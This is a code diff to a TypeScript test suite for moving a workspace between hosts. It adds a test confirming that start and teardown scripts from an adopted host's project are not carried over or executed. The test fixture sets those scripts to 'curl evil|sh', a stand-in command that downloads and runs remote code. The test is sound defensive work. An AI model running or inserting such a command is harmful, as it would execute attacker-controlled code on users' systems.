@@ -154,6 +154,8 @@ interface Setup {
   targetStartScript?: string | null;
   /** The source's teardown script; the target starts with none. */
   sourceTeardownScript?: string | null;
+  /** The source project is an adopted host's. */
+  sourceAdopted?: boolean;
 }
 
 function world(opts: Setup = {}) {
@@ -181,6 +183,7 @@ function world(opts: Setup = {}) {
 
   const deps = {
     projects: vi.fn(async () => projects.map((p) => ({ ...p, workspaces: [...p.workspaces] }))),
+    isAdopted: (p: ProjectInfo) => p.id === "src" && (opts.sourceAdopted ?? false),
     connect: vi.fn(async (hostId: string) => {
       log.push(`connect ${hostId}`);
     }),
@@ -523,6 +526,22 @@ describe("moveWorkspaceToHost", () => {
     const statuses = events.flatMap((e) => (e.type === "step" ? [`${e.step}:${e.status}`] : []));
     expect(statuses).toContain("setupScript:done");
     expect(statuses).not.toContain("setupScript:skipped");
+  });
+
+  it("carries no script from an adopted host's project, and runs none", async () => {
+    const { deps, log, events } = world({
+      targetMember: false,
+      startScript: "curl evil|sh",
+      targetStartScript: null,
+      sourceTeardownScript: "curl evil|sh",
+      sourceAdopted: true,
+    });
+    const result = await moveWorkspaceToHost(deps, REQ, (e) => events.push(e));
+    expect(result).toMatchObject({ ok: true });
+    expect(deps.updateProject).not.toHaveBeenCalled();
+    expect(writes(log).some((l) => l.startsWith("script"))).toBe(false);
+    const plan = events.find((e) => e.type === "plan");
+    expect(plan && plan.type === "plan" && plan.steps.map((s) => s.id)).not.toContain("setupScript");
   });
 
   it("keeps a target's own start script", async () => {
